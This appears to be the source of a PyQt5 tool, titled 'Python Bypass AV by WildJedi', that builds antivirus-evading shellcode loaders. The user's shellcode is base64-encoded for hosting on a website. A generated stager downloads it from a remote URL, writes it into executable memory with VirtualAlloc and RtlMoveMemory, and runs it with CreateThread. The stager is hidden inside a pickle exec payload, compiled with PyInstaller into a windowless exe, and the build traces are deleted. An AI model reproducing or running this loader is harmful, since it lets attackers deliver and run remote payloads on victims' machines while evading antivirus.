# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'window.ui'
#
# Created by: PyQt5 UI code generator 5.15.2
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

import base64,pickle,ctypes,urllib.request,os,subprocess
from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(636, 494)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton2.setGeometry(QtCore.QRect(270, 390, 75, 23))
        self.pushButton2.setObjectName("pushButton2")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(10, 300, 101, 16))
        self.label.setObjectName("label")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(110, 290, 381, 31))
        self.lineEdit.setObjectName("lineEdit")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(10, 340, 171, 16))
        self.label_2.setObjectName("label_2")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_2.setGeometry(QtCore.QRect(180, 330, 381, 31))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.pushButton_1 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_1.setGeometry(QtCore.QRect(270, 250, 75, 23))
        self.pushButton_1.setObjectName("pushButton_1")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.plainTextEdit.setGeometry(QtCore.QRect(3, 0, 631, 221))
        self.plainTextEdit.setObjectName("plainTextEdit")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 636, 23))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.pushButton_1.clicked.connect(self.test1)
        self.pushButton2.clicked.connect(self.test2)
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def test1(self):
        str = self.plainTextEdit.toPlainText()
        str = base64.b64encode(str.encode())
        self.plainTextEdit.setPlainText(str.decode())

    def test2(self):
        # code1 = """
        #         import ctypes,urllib.request,codecs,base64
        #
        #         """
        # url = self.lineEdit.text()
        # code2 = "code = urllib.request.urlopen('" + url + "').read()"
        # code3 = """
        #         code = base64.b64decode(code)
        #         code =codecs.escape_decode(code)[0]
        #         code = bytearray(code)
        #         ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        #         ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(code)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
        #
        #         buf = (ctypes.c_char * len(code)).from_buffer(code)
        #         ctypes.windll.kernel32.RtlMoveMemory(
        #             ctypes.c_uint64(ptr),
        #             buf,
        #             ctypes.c_int(len(code))
        #         )
        #
        #         handle = ctypes.windll.kernel32.CreateThread(
        #             ctypes.c_int(0),
        #             ctypes.c_int(0),
        #             ctypes.c_uint64(ptr),
        #             ctypes.c_int(0),
        #             ctypes.c_int(0),
        #             ctypes.pointer(ctypes.c_int(0))
        #         )
        #
        #         ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""
        # code = code1 + code2 + code3
        url = self.lineEdit.text()
        code = """
import ctypes,urllib.request,codecs,base64

code = urllib.request.urlopen('"""+url+"""').read()
code = base64.b64decode(code)
code =codecs.escape_decode(code)[0]
code = bytearray(code)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(code)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

buf = (ctypes.c_char * len(code)).from_buffer(code)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(code))
)             
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""
        class A(object):
            def __reduce__(self):
                return (exec, (code,))

        #self.plainTextEdit.setPlainText(code)
        ret = pickle.dumps(A())
        ret_base64 = base64.b64encode(ret)
        with open('test.py', 'w+') as f:
            f.write('import base64,pickle,ctypes,urllib.request' + '\n')
            f.write('code =b\'' + ret_base64.decode() + '\'' + '\n')
            f.write('pickle.loads(base64.b64decode(code))' + '\n')
        pyi = self.lineEdit_2.text()
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call(pyi+' '+'-w '+'-F test.py', shell=True, creationflags=CREATE_NO_WINDOW)
        stats = subprocess.call('rd /s /q __pycache__ && rd /s /q build && del /f test.* && move dist\\test.exe .\\ && rd /s /q dist', shell=True, creationflags=CREATE_NO_WINDOW)
        if stats == 0:
            QtWidgets.QMessageBox.about(self,"提示",'生成成功')

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Python Bypass AV by WildJedi"))
        self.plainTextEdit.setPlainText(_translate("MainWindow", '输入64位payload,编码之后放在网站上,\\xfc.....'))
        self.pushButton2.setText(_translate("MainWindow", "生成"))
        self.lineEdit_2.setText("D:\softwares\python39\Scripts\pyinstaller.exe")
        self.label.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt;\">远程url地址:</span></p></body></html>"))
        self.label_2.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt;\">pyinstaller.exe路径:</span></p></body></html>"))
        self.pushButton_1.setText(_translate("MainWindow", "编码"))
